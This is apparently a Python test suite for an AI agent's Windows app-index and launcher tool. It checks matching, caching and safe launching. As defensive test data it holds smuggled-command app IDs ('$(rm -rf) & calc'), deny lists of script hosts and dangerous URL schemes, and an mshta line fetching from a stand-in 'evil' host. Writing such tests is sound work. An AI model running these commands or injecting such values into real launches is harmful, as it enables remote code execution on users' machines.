"""What the installed-app index finds, what it refuses, and how it launches.

The claims under test, in order:

1. **Matching is pure and predictable.** `match` takes a query and entries and
   ranks them by exact/prefix/containment, then by how direct the launch kind
   is -- so "code" finds Visual Studio Code and a Start Menu shortcut beats a
   protocol handler for the same name, and neither depends on filesystem walk
   order.
2. **The dangerous paths are the refused ones.** A protocol whose scheme is
   remote-content (`http`), or whose handler is a script host (`mshta`), or a
   shortcut named "Uninstall" never enters the index; an AppID that does not
   match its pattern never reaches the `shell:AppsFolder\` pairing.
3. **A launch is always a list or a bare `startfile`, never a string with
   input spliced in**, and a stale index entry falls through to the legacy
   PATH chain instead of failing the request.

Everything runs against fixtures and temp directories: no test here starts a
program, and the one real-build smoke test only asserts the shape of what
comes back, never its contents -- a developer's Start Menu decides nothing.
"""

from __future__ import annotations

import asyncio
import os
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

from agent.tools import app_index, apps
from agent.tools.app_index import (
    DENIED_COMMANDS,
    DENIED_SCHEMES,
    KIND_APP_PATH,
    KIND_PATH,
    KIND_PRIORITY,
    KIND_PROTOCOL,
    KIND_SHORTCUT,
    KIND_START_APP,
    MAX_ENTRIES,
    AppEntry,
    AppIndex,
    build_entries,
    build_fast_entries,
    build_slow_entries,
    command_basename,
    entry,
    is_launchable_scheme,
    match,
    merge_entries,
    normalize_key,
    parse_startapps,
    ttl_seconds,
)
from agent.tools.tools_compat import ToolError
from agent.tools.tool_results import UNTRUSTED_OPEN


class NormalizeKeyTests(unittest.TestCase):
    def test_case_and_spacing_collapse(self):
        self.assertEqual(normalize_key("  Google   Chrome "), "google chrome")
        self.assertEqual(normalize_key(None), "")
        self.assertEqual(normalize_key(42), "42")

    def test_extensions_are_suffixes_not_identity(self):
        # Three spellings of one program, which `launch_key` agrees with -- a
        # model that spells a request three ways should get one window and one
        # match, not three of either.
        self.assertEqual(normalize_key("Google Chrome.lnk"), "google chrome")
        self.assertEqual(normalize_key("NOTEPAD.EXE"), "notepad")
        self.assertEqual(normalize_key("Firefox.app"), "firefox")
        self.assertEqual(normalize_key("spotify.desktop"), "spotify")
        self.assertEqual(normalize_key("chrome.url"), "chrome")


class MatchTests(unittest.TestCase):
    def test_exact_beats_prefix_beats_containment(self):
        entries = [
            entry("Visual Studio Code", KIND_PATH, "/a"),
            entry("CodeUp", KIND_PATH, "/b"),
            entry("code", KIND_PATH, "/c"),
        ]
        ranked = match("code", entries)
        self.assertEqual([app.name for app in ranked], ["code", "CodeUp", "Visual Studio Code"])

    def test_a_launch_kind_tie_is_broken_by_directness(self):
        # Both claim the same name at the same tier: the shortcut is the more
        # direct thing to start, the protocol the most indirect launch there is.
        entries = [
            entry("Spotify", KIND_PROTOCOL, "spotify:"),
            entry("Spotify", KIND_SHORTCUT, r"C:\Start Menu\Spotify.lnk"),
        ]
        ranked = match("spotify", entries)
        self.assertEqual([app.kind for app in ranked], [KIND_SHORTCUT, KIND_PROTOCOL])

    def test_word_containment_covers_the_common_request(self):
        entries = [entry("Google Chrome", KIND_SHORTCUT, "/chrome.lnk")]
        self.assertEqual(match("chrome", entries), entries)
        self.assertEqual(match("google", entries), entries)

    def test_an_empty_query_or_a_miss_returns_nothing(self):
        entries = [entry("Notepad", KIND_PATH, "/n")]
        self.assertEqual(match("", entries), [])
        self.assertEqual(match("   ", entries), [])
        self.assertEqual(match("spreadsheet", entries), [])

    def test_the_limit_is_honoured(self):
        entries = [entry(f"App {index}", KIND_PATH, f"/{index}") for index in range(10)]
        self.assertEqual(len(match("app", entries, limit=3)), 3)


class StartAppsParseTests(unittest.TestCase):
    TAB = "\t"

    def test_a_valid_line_becomes_a_startapp_entry(self):
        text = f"Microsoft Store{self.TAB}Microsoft.WindowsStore_8wekyb3d8bbwe!App\r\n"
        parsed = parse_startapps(text)
        self.assertEqual(len(parsed), 1)
        self.assertEqual(parsed[0].name, "Microsoft Store")
        self.assertEqual(parsed[0].kind, KIND_START_APP)
        self.assertEqual(parsed[0].target, "Microsoft.WindowsStore_8wekyb3d8bbwe!App")

    def test_a_classic_appid_without_a_bang_is_accepted(self):
        text = f"Notepad{self.TAB}Microsoft.WindowsNotepad.exe"
        self.assertEqual(len(parse_startapps(text)), 1)

    def test_a_hostile_or_malformed_appid_is_dropped(self):
        # The AppID gets paired with shell:AppsFolder\ later; anything that is
        # not a plausible ID never becomes a launchable entry at all.
        hostile = [
            f"Evil{self.TAB}$(rm -rf) & calc",
            f"Evil{self.TAB}id with spaces",
            f"Evil{self.TAB}id\"quoted",
            f"Evil{self.TAB}",
            f"{self.TAB}SomeApp",
            "no tab on this line at all",
        ]
        self.assertEqual(parse_startapps("\n".join(hostile)), [])


class SchemeDenyTests(unittest.TestCase):
    def test_command_basename_handles_both_registry_forms(self):
        self.assertEqual(
            command_basename(r'"C:\Program Files\Spotify\spotify.exe" --uri=%1'),
            "spotify.exe",
        )
        self.assertEqual(
            command_basename(r"C:\Windows\System32\notepad.exe %1"),
            "notepad.exe",
        )
        self.assertEqual(command_basename(""), "")
        self.assertEqual(command_basename(None), "")

    def test_a_normal_local_handler_is_launchable(self):
        self.assertTrue(
            is_launchable_scheme("spotify", r'"C:\Users\x\AppData\Spotify\spotify.exe" "%1"')
        )

    def test_remote_content_schemes_are_refused(self):
        # The launch passes no arguments, but the scheme alone is enough for
        # these to fetch or execute something -- this is the class of scheme
        # that has been an exploit carrier.
        for scheme in ("file", "http", "https", "javascript", "ms-msdt", "search-ms"):
            with self.subTest(scheme=scheme):
                self.assertFalse(is_launchable_scheme(scheme, r"C:\any\app.exe"))

    def test_a_script_host_handler_is_refused(self):
        # A registry entry pointing here is either an accident or something
        # that got there without asking; either way it is not "open Spotify".
        for command in (
            "powershell.exe -enc AAAA",
            r"C:\Windows\System32\cmd.exe /c start x",
            "mshta.exe http://evil/x.hta",
            r"C:\Windows\System32\rundll32.exe shell32.dll,EntryPoint",
        ):
            with self.subTest(command=command):
                self.assertFalse(is_launchable_scheme("steam", command))

    def test_an_unreadable_handler_fails_closed(self):
        # No command, or one we cannot parse: the protocol is simply not
        # offered. Refusing is free; guessing is not.
        self.assertFalse(is_launchable_scheme("spotify", ""))
        self.assertFalse(is_launchable_scheme("spotify", "   "))

    def test_a_scheme_that_could_not_be_an_app_name_is_refused(self):
        self.assertFalse(is_launchable_scheme("Not an app!", "app.exe"))
        self.assertFalse(is_launchable_scheme("x", "app.exe"))  # too short

    def test_the_deny_lists_cover_the_known_bad_actors(self):
        self.assertTrue({"file", "http", "https", "javascript"} <= DENIED_SCHEMES)
        self.assertTrue(
            {"powershell.exe", "cmd.exe", "mshta.exe", "rundll32.exe", "certutil.exe"}
            <= DENIED_COMMANDS
        )


@unittest.skipUnless(sys.platform == "win32", "Start Menu is a Windows concept")
class StartMenuCollectTests(unittest.TestCase):
    """A fixture tree stands in for a real Start Menu."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        programs = root / "Microsoft" / "Windows" / "Start Menu" / "Programs"
        programs.mkdir(parents=True)
        (programs / "Notepad.lnk").write_text("", encoding="utf-8")
        (programs / "Google Chrome.lnk").write_text("", encoding="utf-8")
        # An uninstaller shortcut: running one starts an uninstall, which is
        # not what anyone means by "open the app".
        (programs / "Uninstall Foo.lnk").write_text("", encoding="utf-8")
        (programs / "Remove Bar.url").write_text("", encoding="utf-8")
        # A nested app, and a file that is not a shortcut at all.
        nested = programs / "Vendor"
        nested.mkdir()
        (nested / "Deep App.lnk").write_text("", encoding="utf-8")
        (nested / "readme.txt").write_text("", encoding="utf-8")

        # Both roots point at fixtures so a real machine's ProgramData never
        # decides what these tests see.
        empty = root / "empty"
        empty.mkdir()
        patcher = mock.patch.dict(
            os.environ,
            {"APPDATA": str(root), "ProgramData": str(empty)},
        )
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_shortcuts_and_urls_are_found_and_uninstallers_are_not(self):
        found = app_index.collect_start_menu()
        names = {app.name for app in found}
        self.assertIn("Notepad", names)
        self.assertIn("Google Chrome", names)
        self.assertIn("Deep App", names)  # recursion works
        self.assertNotIn("Uninstall Foo", names)
        self.assertNotIn("Remove Bar", names)
        self.assertNotIn("readme", names)

    def test_every_shortcut_is_launchable_by_its_own_path(self):
        found = app_index.collect_start_menu()
        notepad = next(app for app in found if app.name == "Notepad")
        self.assertEqual(notepad.kind, KIND_SHORTCUT)
        self.assertTrue(notepad.target.endswith("Notepad.lnk"))
        self.assertTrue(os.path.isabs(notepad.target))


class CacheTests(unittest.TestCase):
    @staticmethod
    def _index(builder, clock):
        return AppIndex(builder=builder, now=lambda: clock[0])

    def test_one_build_serves_reads_until_the_ttl_expires(self):
        clock = [1000.0]
        builds = []

        def builder():
            builds.append(1)
            return [entry("Fake App", KIND_PATH, "/fake")]

        index = self._index(builder, clock)
        index.get()
        index.get()
        index.get()
        self.assertEqual(len(builds), 1, "the index rebuilt inside its own TTL")

        clock[0] += ttl_seconds() + 1
        index.get()
        self.assertEqual(len(builds), 2, "a stale index was never refreshed")

    def test_force_rebuilds_even_inside_the_ttl(self):
        builds = []

        def builder():
            builds.append(1)
            return []

        index = self._index(builder, [0.0])
        index.get()
        index.get(force=True)
        self.assertEqual(len(builds), 2)

    def test_a_forced_rebuild_does_not_block_an_ordinary_read(self):
        # The lock guards the state, never the build: PowerShell can be
        # mid-flight while another reader answers from the current entries.
        # If a regression held the lock during a build, the reader below
        # would still be waiting when we check -- the failure is recorded
        # *before* the release, so it cannot unblock and pass by accident.
        release = threading.Event()
        started = threading.Event()

        def blocking_builder():
            started.set()
            release.wait(timeout=5)
            return [entry("Fresh", KIND_PATH, "/fresh")]

        index = AppIndex(builder=blocking_builder, now=lambda: 0.0)
        index.mark_built()  # a warm cache, so the forced rebuild is the only builder

        rebuild = threading.Thread(target=lambda: index.get(force=True))
        rebuild.start()
        self.assertTrue(started.wait(timeout=5), "the rebuild never started")

        seen: list = []
        reader = threading.Thread(target=lambda: seen.append(index.get()))
        reader.start()
        reader.join(timeout=5)
        blocked_too_long = reader.is_alive()

        release.set()
        rebuild.join(timeout=5)
        reader.join(timeout=5)

        self.assertFalse(blocked_too_long, "an ordinary read blocked behind an in-flight rebuild")
        self.assertEqual(seen, [()])
        self.assertEqual([app.name for app in index.get()], ["Fresh"])

    def test_ttl_env_is_clamped_and_bad_values_fall_back(self):
        with mock.patch.dict(os.environ, {app_index.TTL_VAR: "5"}):
            self.assertEqual(ttl_seconds(), app_index.MIN_TTL_SECONDS)
        with mock.patch.dict(os.environ, {app_index.TTL_VAR: "999999"}):
            self.assertEqual(ttl_seconds(), app_index.MAX_TTL_SECONDS)
        with mock.patch.dict(os.environ, {app_index.TTL_VAR: "not-a-number"}):
            self.assertEqual(ttl_seconds(), app_index.DEFAULT_TTL_SECONDS)
        with mock.patch.dict(os.environ, {app_index.TTL_VAR: ""}):
            self.assertEqual(ttl_seconds(), app_index.DEFAULT_TTL_SECONDS)
        with mock.patch.dict(os.environ, {app_index.TTL_VAR: "nan"}):
            # An index that never expires is a list of things that are no
            # longer true; NaN would poison every comparison below it.
            self.assertEqual(ttl_seconds(), app_index.DEFAULT_TTL_SECONDS)

    def test_a_miss_may_rebuild_only_after_the_cooldown(self):
        clock = [0.0]
        index = AppIndex(builder=list, now=lambda: clock[0])
        # Never built: a miss earns exactly one immediate rebuild.
        self.assertTrue(index.miss_rebuild_due())
        index.mark_built()
        self.assertFalse(index.miss_rebuild_due(), "a miss storm would spawn a probe per typo")
        clock[0] = app_index.MISS_REBUILD_SECONDS
        self.assertTrue(index.miss_rebuild_due(), "a fresh install would stay invisible forever")


class BuildEntriesTests(unittest.TestCase):
    def test_a_broken_collector_does_not_sink_the_index(self):
        def boom():
            raise RuntimeError("the machine is on fire")

        def fine():
            return [entry("Alpha", KIND_PATH, "/alpha")]

        with mock.patch.object(app_index, "_collectors", return_value=(boom, fine)):
            built = build_entries()
        self.assertEqual([app.name for app in built], ["Alpha"])

    def test_the_first_collector_wins_a_duplicate_key(self):
        # Collectors run in priority order, so a Start Menu shortcut for
        # Chrome claims the name before Chrome's protocol handler can.
        def first():
            return [entry("Chrome", KIND_SHORTCUT, r"C:\Start Menu\Chrome.lnk")]

        def second():
            return [entry("chrome.exe", KIND_PATH, r"C:\Chrome\chrome.exe")]

        with mock.patch.object(app_index, "_collectors", return_value=(first, second)):
            built = build_entries()
        self.assertEqual(len(built), 1)
        self.assertEqual(built[0].kind, KIND_SHORTCUT)
        self.assertEqual(built[0].target, r"C:\Start Menu\Chrome.lnk")

    def test_the_index_stops_at_its_ceiling(self):
        flood = [entry(f"App {index:05d}", KIND_PATH, f"/{index}") for index in range(MAX_ENTRIES + 50)]
        with mock.patch.object(app_index, "_collectors", return_value=(lambda: flood,)):
            built = build_entries()
        self.assertEqual(len(built), MAX_ENTRIES)


class TierTests(unittest.TestCase):
    """The two-tier split: 88 ms on the common path, completeness on a miss.

    A full build measured 2016.9 ms on the machine this was written on, and
    2398 ms of that was two collectors. These tests hold the split itself --
    that the tiers partition the collectors, that merging them reproduces the
    full build's ranking, and that a hit is never charged for a build it did
    not need.
    """

    @staticmethod
    def _fast_index(*, fast=None, slow=None):
        """A two-tier index driven entirely by fixtures -- no real collector.

        ``fast`` and ``slow`` are *builders* (callables), not lists: the whole
        point of these tests is when the slow one runs, so evaluating it while
        setting the fixture up would be testing the fixture.
        """
        return AppIndex(
            builder=fast if fast is not None else list,
            slow_builder=slow if slow is not None else list,
            now=lambda: 0.0,
        )

    @staticmethod
    def _recording(calls: list[int], produced):
        """A builder that records that it was called, then answers."""

        def build():
            calls.append(1)
            return list(produced)

        return build

    def test_the_tiers_partition_the_collectors(self):
        # `fast + slow` must be *exactly* `_collectors`, once each. A collector
        # added to `_collectors` and forgotten here would silently never be
        # indexed on any machine.
        fast = set(app_index._fast_collectors())
        slow = set(app_index._slow_collectors())
        self.assertFalse(fast & slow, f"a collector is in both tiers: {fast & slow}")
        self.assertEqual(fast | slow, set(app_index._collectors()))

    def test_the_slow_tier_is_the_two_expensive_collectors(self):
        self.assertEqual(
            {collect.__name__ for collect in app_index._slow_collectors()},
            {"collect_start_apps", "collect_protocols"},
        )

    def test_a_name_only_the_slow_tier_has_is_kept(self):
        merged = merge_entries(
            [entry("Notepad", KIND_PATH, r"C:\Windows\notepad.exe")],
            [entry("Xbox Game Bar", KIND_START_APP, "Microsoft.XboxGamingUI_abc")],
        )
        self.assertEqual([app.name for app in merged], ["Notepad", "Xbox Game Bar"])

    def test_a_better_kind_from_the_slow_tier_takes_the_name(self):
        # `collect_start_apps` runs *before* `collect_app_paths` in the full
        # order but lands in the other tier, so ordering cannot carry this
        # decision the way it did in one pass -- priority has to.
        merged = merge_entries(
            [entry("Spotify", KIND_APP_PATH, r"C:\App Paths\spotify.exe")],
            [entry("Spotify", KIND_START_APP, "SpotifyAB_something")],
        )
        self.assertEqual(len(merged), 1, "both tiers kept a copy of the name")
        self.assertEqual(merged[0].kind, KIND_START_APP)

    def test_a_worse_kind_from_the_slow_tier_leaves_the_name_alone(self):
        for fast_kind, slow_kind in ((KIND_SHORTCUT, KIND_PROTOCOL), (KIND_PATH, KIND_PROTOCOL)):
            with self.subTest(fast=fast_kind, slow=slow_kind):
                merged = merge_entries(
                    [entry("Chrome", fast_kind, "fast-target")],
                    [entry("Chrome", slow_kind, "slow-target")],
                )
                self.assertEqual(len(merged), 1)
                self.assertEqual(merged[0].kind, fast_kind, "a worse kind displaced a better one")

    def test_a_hit_is_answered_without_ever_starting_the_slow_tier(self):
        slow_calls: list[int] = []
        index = self._fast_index(
            fast=lambda: [entry("Notepad", KIND_PATH, r"C:\Windows\notepad.exe")],
            slow=self._recording(slow_calls, [entry("Xbox", KIND_START_APP, "Xbox")]),
        )

        found = match("notepad", index.get(), limit=1)
        self.assertEqual([app.name for app in found], ["Notepad"])
        self.assertEqual(slow_calls, [], "a read paid two and a half seconds it did not need")

        # Reading never starts it; *asking* does -- and only a caller that
        # already missed has any reason to ask, which is what
        # `find(complete=True)` encodes.
        self.assertTrue(index.await_slow(timeout=5))
        self.assertEqual(slow_calls, [1])

    def test_a_miss_starts_one_slow_build_and_then_merges_it(self):
        slow_calls: list[int] = []
        index = self._fast_index(
            slow=self._recording(slow_calls, [entry("Xbox Game Bar", KIND_START_APP, "Xbox")])
        )
        index.get()

        self.assertTrue(index.await_slow(timeout=5), "a miss did not start the slow tier")
        self.assertEqual(slow_calls, [1])
        self.assertEqual([app.name for app in match("xbox", index.get(), limit=3)], ["Xbox Game Bar"])

        # Settled now: a second miss must not spend a second PowerShell probe.
        self.assertFalse(index.await_slow(timeout=0.05))
        self.assertEqual(slow_calls, [1])

    def test_an_index_that_was_never_built_starts_nothing(self):
        # The guard that keeps a test with a patched reader from spawning a real
        # process, and the reason `find` may be called freely in unit tests.
        slow_calls: list[int] = []
        index = self._fast_index(slow=self._recording(slow_calls, []))
        self.assertFalse(index.await_slow(timeout=0.05))
        self.assertEqual(slow_calls, [])

    def test_a_custom_builder_alone_is_not_tiered(self):
        # `AppIndex(builder=...)` means "this caller owns the whole index".
        # Scheduling a background thread against it would be a second, silent
        # writer to a list a test is counting.
        index = AppIndex(builder=list, slow_builder=None, now=lambda: 0.0)
        index.get()
        self.assertFalse(index.await_slow(timeout=0.05))

    def test_a_slow_build_started_before_a_reset_does_not_resurrect_it(self):
        started = threading.Event()
        release = threading.Event()

        def slow_builder():
            started.set()
            release.wait(timeout=5)
            return [entry("Ghost", KIND_START_APP, "gone")]

        index = AppIndex(builder=lambda: [], slow_builder=slow_builder, now=lambda: 0.0)
        index.get()

        waiter = threading.Thread(target=lambda: index.await_slow(timeout=5))
        waiter.start()
        self.assertTrue(started.wait(timeout=5), "the slow build never started")

        index.forget()
        release.set()
        waiter.join(timeout=5)

        self.assertEqual(index.get(), (), "a discarded build wrote back into the cache")

    def test_find_complete_pays_for_completeness_only_after_a_miss(self):
        slow_calls: list[int] = []

        def slow_builder():
            slow_calls.append(1)
            return [entry("Xbox Game Bar", KIND_START_APP, "Microsoft.XboxGamingUI_abc")]

        index = AppIndex(
            builder=lambda: [entry("Notepad", KIND_PATH, r"C:\Windows\notepad.exe")],
            slow_builder=slow_builder,
            now=lambda: 0.0,
        )
        with mock.patch.object(app_index, "_INDEX", index):
            hit = app_index.find("notepad", complete=True)
            self.assertEqual([app.name for app in hit], ["Notepad"])
            self.assertEqual(slow_calls, [], "a hit waited for completeness it already had")

            completed = app_index.find("xbox", complete=True)
        self.assertEqual([app.name for app in completed], ["Xbox Game Bar"])
        self.assertEqual(slow_calls, [1])

    def test_find_without_complete_never_touches_the_slow_tier(self):
        slow_calls: list[int] = []
        index = self._fast_index(slow=self._recording(slow_calls, [entry("Xbox", KIND_START_APP, "Xbox")]))
        with mock.patch.object(app_index, "_INDEX", index):
            app_index.find("xbox")
        self.assertEqual(slow_calls, [], "the plain read path started a background build")


class ResolveTests(unittest.TestCase):
    def setUp(self):
        # The process-wide cache is shared with every other test file in this
        # run; these assertions are about `resolve`'s own logic, so the cache
        # starts empty and "never built" makes a rebuild due deterministically.
        app_index.reset()

    def test_a_hit_costs_one_read_and_no_rebuild(self):
        calls = []
        notepad = entry("Notepad", KIND_PATH, r"C:\Windows\notepad.exe")

        def fake_entries(*, force=False):
            calls.append(force)
            return (notepad,)

        with mock.patch.object(app_index, "entries", side_effect=fake_entries):
            resolved = app_index.resolve("notepad")
        self.assertEqual(resolved, notepad)
        self.assertEqual(calls, [False])

    def test_a_miss_spends_at_most_one_rebuild(self):
        # "I just installed it" works (one forced read), but a typo does not
        # become a PowerShell probe per keystroke.
        calls = []

        def fake_entries(*, force=False):
            calls.append(force)
            return ()

        with mock.patch.object(app_index, "entries", side_effect=fake_entries):
            self.assertIsNone(app_index.resolve("definitely-not-installed"))
        self.assertEqual(calls, [False, True])

    def test_a_hit_after_the_rebuild_still_returns_none(self):
        with mock.patch.object(app_index, "entries", return_value=()):
            self.assertIsNone(app_index.resolve("nothing here either"))


class StartEntryTests(unittest.TestCase):
    """`start_entry` dispatch: one entry, one safe mechanism, no shell."""

    @unittest.skipUnless(sys.platform == "win32", "shortcuts are Windows-only here")
    def test_a_shortcut_is_handed_to_windows_unparsed(self):
        # Windows resolves the .lnk itself -- target, arguments, working
        # directory -- which is one less thing to parse and trust.
        with mock.patch.object(apps.os, "startfile") as startfile:
            apps.start_entry(entry("Notepad", KIND_SHORTCUT, r"C:\Start Menu\Notepad.lnk"))
        startfile.assert_called_once_with(r"C:\Start Menu\Notepad.lnk")

    @unittest.skipUnless(sys.platform == "win32", "protocols are Windows-only here")
    def test_a_protocol_launch_carries_no_arguments(self):
        with mock.patch.object(apps.os, "startfile") as startfile:
            apps.start_entry(entry("spotify", KIND_PROTOCOL, "spotify:"))
        # Exactly the bare scheme: nothing from a request is appended, which
        # is what makes `startfile("http:...")` unreachable rather than merely
        # denied.
        startfile.assert_called_once_with("spotify:")

    def test_a_path_entry_is_spawned_as_a_list(self):
        with mock.patch.object(apps, "spawn") as spawn:
            apps.start_entry(entry("ffmpeg", KIND_PATH, r"C:\bin\ffmpeg.exe"))
        spawn.assert_called_once_with([r"C:\bin\ffmpeg.exe"])

    @unittest.skipUnless(sys.platform == "win32", "AppID pairing is Windows-only here")
    def test_an_app_id_is_validated_before_pairing_with_the_shell_prefix(self):
        with mock.patch.object(apps, "spawn") as spawn:
            apps.start_entry(
                entry("Store App", KIND_START_APP, "Microsoft.WindowsStore_8wekyb3d8bbwe!App")
            )
        spawn.assert_called_once_with(
            ["explorer.exe", "shell:AppsFolder\\Microsoft.WindowsStore_8wekyb3d8bbwe!App"]
        )

        # The one target that gets concatenated with a prefix gets checked
        # again at the point of concatenation, even though collection already
        # checked it: a prefix plus an unchecked value is how "no shell"
        # quietly becomes one.
        spawn.reset_mock()
        with mock.patch.object(apps, "spawn") as spawn:
            with self.assertRaises(OSError):
                apps.start_entry(entry("Evil", KIND_START_APP, "bad id & calc.exe"))
        spawn.assert_not_called()

    def test_an_empty_target_is_refused(self):
        with self.assertRaises(OSError):
            apps.start_entry(AppEntry("Ghost", KIND_PATH, ""))


class LaunchIndexTests(unittest.TestCase):
    """`launch` consults the index first and still falls back when it fails."""

    def test_an_index_hit_launches_the_index_target(self):
        target = entry("Notepad", KIND_SHORTCUT, r"C:\Start Menu\Notepad.lnk")
        with mock.patch.object(apps.app_index, "resolve", return_value=target), mock.patch.object(
            apps, "start_entry"
        ) as start:
            self.assertEqual(apps.launch("notepad"), "Opened notepad.")
        start.assert_called_once_with(target)

    def test_a_stale_index_entry_falls_through_to_path(self):
        # An entry whose target was since uninstalled must not end the request:
        # the legacy chain gets its turn, exactly as before the index existed.
        stale = entry("Notepad", KIND_SHORTCUT, r"C:\gone\Notepad.lnk")
        with mock.patch.object(apps.app_index, "resolve", return_value=stale), mock.patch.object(
            apps, "start_entry", side_effect=FileNotFoundError("gone")
        ), mock.patch.object(apps.shutil, "which", return_value="C:/apps/notepad.exe"), mock.patch.object(
            apps, "spawn"
        ) as spawn:
            self.assertEqual(apps.launch("notepad"), "Opened notepad.")
        spawn.assert_called_once_with(["C:/apps/notepad.exe"])

    @unittest.skipUnless(sys.platform == "win32", "exercises the Windows fallthrough chain")
    def test_an_index_entry_that_wont_start_reports_a_failure_not_a_miss(self):
        # "I found it but could not start it" is a different sentence from
        # "there is no such app": the model retries the first and stops the
        # second, and conflating them is how a user gets silence.
        stale = entry("Notepad", KIND_SHORTCUT, r"C:\gone\Notepad.lnk")
        with mock.patch.object(apps.app_index, "resolve", return_value=stale), mock.patch.object(
            apps, "start_entry", side_effect=OSError("jammed")
        ), mock.patch.object(apps.shutil, "which", return_value=None), mock.patch.object(
            apps.sys, "platform", "win32"
        ), mock.patch.object(apps.os, "startfile", side_effect=FileNotFoundError):
            with self.assertRaisesRegex(ToolError, "found notepad"):
                apps.launch("notepad")


class FindAppToolTests(unittest.TestCase):
    @staticmethod
    def _context():
        return object()

    def test_it_returns_names_wrapped_as_retrieved_data(self):
        chrome = entry("Google Chrome", KIND_SHORTCUT, r"C:\Start Menu\Google Chrome.lnk")
        with mock.patch.object(app_index, "find", return_value=[chrome]):
            result = asyncio.run(apps.find_app(self._context(), "chrome"))
        # Wrapped, because a PWA's display name is chosen by the site that
        # wrote it -- this list is data the model reads, not text it wrote.
        self.assertIn(UNTRUSTED_OPEN, result)
        self.assertIn("Google Chrome", result)

    def test_a_miss_is_a_specific_error(self):
        with mock.patch.object(app_index, "find", return_value=[]):
            with self.assertRaisesRegex(ToolError, "couldn't find an app"):
                asyncio.run(apps.find_app(self._context(), "spreadsheet"))

    def test_shell_metacharacters_never_reach_the_index(self):
        # validate_app_name refuses first; the index never sees the string.
        with mock.patch.object(app_index, "find") as find:
            with self.assertRaises(ToolError):
                asyncio.run(apps.find_app(self._context(), "notepad & calc"))
        find.assert_not_called()


class RealBuildSmokeTests(unittest.TestCase):
    def test_a_real_build_returns_entries_and_never_raises(self):
        # Shape only: this runs the actual registry/PowerShell/filesystem
        # collectors against whatever machine the suite is on, so it asserts
        # that they produce a well-formed list -- never that any particular
        # app exists, because a developer's Start Menu decides nothing here.
        built = build_entries()
        self.assertIsInstance(built, list)
        seen = set()
        for app in built:
            self.assertTrue(app.name, "an entry with no name cannot be matched")
            self.assertTrue(app.target, "an entry with no target cannot be launched")
            self.assertNotIn(normalize_key(app.name), seen, "a duplicate key survived dedup")
            seen.add(normalize_key(app.name))

    def test_both_tiers_build_on_the_real_machine(self):
        # The fast tier is what a cold lookup actually pays for, and the slow
        # tier is the one that runs in a background thread where an exception
        # would be visible only as a log line -- so both get run directly here,
        # for shape, without asserting anything about which apps exist.
        built: dict[str, list[AppEntry]] = {}
        for name, builder in (("fast", build_fast_entries), ("slow", build_slow_entries)):
            with self.subTest(tier=name):
                built[name] = builder()
                self.assertIsInstance(built[name], list)
                for app in built[name]:
                    self.assertTrue(app.name, "an entry with no name cannot be matched")
                    self.assertTrue(app.target, "an entry with no target cannot be launched")
                    self.assertIn(app.kind, KIND_PRIORITY)

        # Folding them must not create a name two entries claim: the two tiers
        # were collected separately, so "first collector wins" has to be
        # re-established by the merge rather than inherited from the order.
        merged = merge_entries(built["fast"], built["slow"])
        seen: set[str] = set()
        for app in merged:
            key = normalize_key(app.name)
            self.assertNotIn(key, seen, f"merging the tiers left two entries named {app.name!r}")
            seen.add(key)
        self.assertGreaterEqual(len(merged), len(built["fast"]), "the merge dropped fast-tier entries")


if __name__ == "__main__":
    unittest.main()
